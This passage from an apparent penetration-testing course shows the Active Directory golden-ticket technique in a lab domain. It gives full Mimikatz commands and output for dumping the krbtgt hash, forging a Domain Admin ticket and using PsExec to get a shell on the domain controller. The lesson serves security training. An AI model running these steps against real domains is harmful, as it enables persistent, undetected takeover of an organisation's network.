### 23.2.1

We'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt.
If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
Although this technique's name resembles the Silver Ticket one that we encountered in the Attacking Authentication Module, Golden Tickets provide a more powerful attack vector. While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources, as we'll see shortly.

For example, we could create a TGT stating that a non-privileged user is a member of the Domain Admins group, and the domain controller will trust it because it is correctly encrypted.

**We must carefully protect stolen krbtgt password hashes because they grant unlimited domain access. Consider explicitly obtaining the client's permission before executing this technique.**

This provides a neat way of keeping persistence in an Active Directory environment, but the best advantage is that the krbtgt account password is not automatically changed.
This password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version. Because of this, it is not uncommon to find very old krbtgt password hashes.

Failed attempt to perform lateral movement
```
C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```

With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.

To simulate this, we'll log in to the domain controller with remote desktop using the jeffadmin account. Then we will run Mimikatz from C:\Tools, and issue the lsadump::lsa command as displayed below:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
...
```
Listing 35 - Dumping the krbtgt password hash using Mimikatz

 Before we generate the golden ticket let's launch mimikatz and delete any existing Kerberos tickets with kerberos::purge.
```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
```
    Listing 36 - Purging existing Kerberos Tickets

Now, we'll supply the domain SID (which we can gather with whoami /user) to the Mimikatz kerberos::golden command to create the golden ticket.

This time, we'll use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash of the krbtgt user account. Starting July 2022, Microsoft improved the authentication process, so we'll need to provide an existing account. Let's set the golden ticket's username to jen. Before it didn't matter if the account existed.
```
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
```
    Listing 37 - Creating a golden ticket using Mimikatz

Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain. The values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.

With the golden ticket injected into memory, let's use PsExec_ to launch a new command prompt with misc::cmd.
```
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
   IPv4 Address. . . . . . . . . . . : 192.168.50.70
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
C:\Windows\system32>whoami
corp\jen
```
    Listing 38 - Using PsExec to access DC01

Great! We now have an interactive command prompt on the domain controller. Now let's use the whoami command to verify that our user jen is now part of the Domain Admin group.
```
C:\Windows\system32>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes    
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
CORP\Group Policy Creator Owners            Group            S-1-5-21-1987370270-658905905-1781884369-520 Mandatory group, Enabled by default, Enabled group
CORP\Schema Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
CORP\Enterprise Admins                      Group            S-1-5-21-1987370270-658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288   
```                                                                     
    Listing 39 - Performing lateral movement and persistence using the golden ticket and PsExec

Perfect! Listing group memberships shows that we are now a member of multiple powerful groups including the Domain Admins group. Excellent.

Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication as we discussed earlier in this Module.

If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. This is illustrated in the listing below.
```
C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.50.70:
Access is denied.
```
    Listing 40 - Use of NTLM authentication blocks our access

In this section, we have demonstrated the golden ticket technique as a persistence mechanism. By obtaining the NTLM hash of the krbtgt user, we can issue domain-administrative TGTs to any existing low-privileged account. This allows us to obtain inconspicuous legitimate access to the entire AD domain.